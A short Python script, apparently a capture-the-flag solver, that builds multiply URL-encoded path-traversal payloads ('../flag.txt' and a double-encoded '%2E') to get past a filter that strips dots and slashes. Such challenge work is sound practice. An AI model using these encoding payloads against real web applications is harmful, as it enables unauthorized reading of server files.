import urllib.parse


def ignore_it(file_param):
    yoooo = file_param.replace(".", "").replace("/", "")
    if yoooo != file_param:
        return "Illegal characters detected in file parameter!"
    return yoooo


def another_useless_function(file_param):
    return urllib.parse.unquote(file_param)


def url_encode_path(file_param):
    return urllib.parse.quote(file_param, safe="")


def main():
    text = "../flag.txt"
    # text = "/secret_of_j4ck4l/flag.txt"
    text = url_encode_path(text)
    text = url_encode_path(text)
    # text = not_ignore_it(text)
    text = url_encode_path(text)
    # text = not_ignore_it(text)
    print(f"{text}")
    again = "%2E"
    text = url_encode_path(again)
    text = url_encode_path(text)
    print(f"{text}")


if __name__ == "__main__":
    main()
